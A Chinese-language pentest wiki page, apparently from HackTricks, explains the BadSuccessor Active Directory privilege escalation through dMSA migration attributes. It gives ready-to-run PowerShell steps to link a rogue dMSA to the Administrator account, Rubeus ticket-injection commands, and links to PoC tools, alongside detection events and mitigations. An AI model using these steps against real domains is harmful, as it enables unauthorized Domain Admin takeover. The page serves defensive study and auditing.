# BadSuccessor：通过滥用委派 MSA 迁移实现权限提升

{{#include ../../banners/hacktricks-training.md}}

## 概述

委派托管服务帐户（**dMSA**）是 **gMSA** 的下一代继任者，随 Windows Server 2025 一同推出。合法的迁移工作流允许管理员将*旧*帐户（用户、计算机或服务帐户）替换为 dMSA，同时透明地保留其权限。该工作流通过 `Start-ADServiceAccountMigration` 和 `Complete-ADServiceAccountMigration` 等 PowerShell cmdlet 提供，并依赖 **dMSA 对象**上的两个 LDAP 属性：

* **`msDS-ManagedAccountPrecededByLink`** – 指向被取代（旧）帐户的 *DN 链接*。
* **`msDS-DelegatedMSAState`**       – 迁移状态（`0` = 无，`1` = 进行中，`2` = *已完成*）。<sup>[[1]](#references)</sup>

如果攻击者可以在某个 OU 中创建**任意** dMSA，并直接操纵这两个属性，LSASS 和 KDC 就会将该 dMSA 视为所链接帐户的*继任者*。之后，攻击者以该 dMSA 进行身份验证时，**会继承所链接帐户的所有权限**——如果链接的是 Administrator 帐户，甚至可获得 **Domain Admin** 权限。<sup>[[1]](#references)</sup>

Unit 42 于 2025 年将此技术命名为 **BadSuccessor**。Microsoft 后来为其分配了 **CVE-2025-53779**，并于 **2025 年 8 月**发布安全更新。该技术仍适用于未修补的 Windows Server 2025 环境，也适用于对危险 OU 委派的审查。<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

在已修补的 DC 上，如果攻击者也能写入目标帐户的迁移属性，仍可通过[双向 dMSA 迁移](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch)暴露目标帐户。与最初的任意目标攻击相比，这种情况的适用范围更窄。

### 攻击前提

1. 某个帐户*有权限*在**组织单位（OU）**中创建对象，*并且*至少具有以下权限之一：
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`** 对象类
   * `Create Child` → **`All Objects`**（通用创建权限）
2. 可通过网络连接 LDAP 和 Kerberos（标准的域加入场景 / 远程攻击）。<sup>[[1]](#references)</sup>

## 枚举易受攻击的 OU

Unit 42 发布了一个 PowerShell 辅助脚本，用于解析每个 OU 的安全描述符并突出显示所需的 ACE：<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

在底层，脚本会对 `(objectClass=organizationalUnit)` 执行分页 LDAP 搜索，并检查每个 `nTSecurityDescriptor` 是否包含

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8`（对象类 *msDS-DelegatedManagedServiceAccount*）

## 利用步骤

找到一个可写 OU 后，只需执行 3 次 LDAP 写入即可完成攻击：<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

复制完成后，攻击者可以直接以 `attacker_dMSA$` **logon**，或请求 Kerberos TGT——Windows 将构建被取代账户的 token。<sup>[[1]](#references)</sup>

### 自动化

多个公开 PoC 封装了整个工作流程，包括密码获取和票据管理：

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## 检测与狩猎

在 OU 上启用 **对象审核**，并监控以下 Windows 安全事件：<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – 创建 **dMSA** 对象
* **5136** – 修改 **`msDS-ManagedAccountPrecededByLink`**
* **4662** – 特定属性变更
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – 为 dMSA 颁发 TGT

关联 `4662`（属性修改）、`4741`（创建计算机/服务账户）和 `4624`（后续登录），即可快速发现 BadSuccessor 活动。**XSIAM** 等 XDR 解决方案提供了开箱即用的查询（参见参考资料）。<sup>[[2]](#references)</sup>

## 缓解措施

* 安装 Microsoft 针对 **CVE-2025-53779** 发布的安全更新，并确认每个 Windows Server 2025 域控制器的补丁级别。<sup>[[6]](#references)</sup>
* 遵循**最小权限**原则——仅将 *Service Account* 管理权限委派给可信角色。
* 从明确不需要该权限的 OU 中移除 `Create Child` / `msDS-DelegatedManagedServiceAccount`。
* 监控上述事件 ID，并在 *非 Tier-0* 身份创建或编辑 dMSA 时发出警报。

## 另请参阅


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor：滥用 dMSA 提升 Active Directory 权限 – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – 当正常账户变得不再正常：利用 Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor 模块](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft 安全响应中心 – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
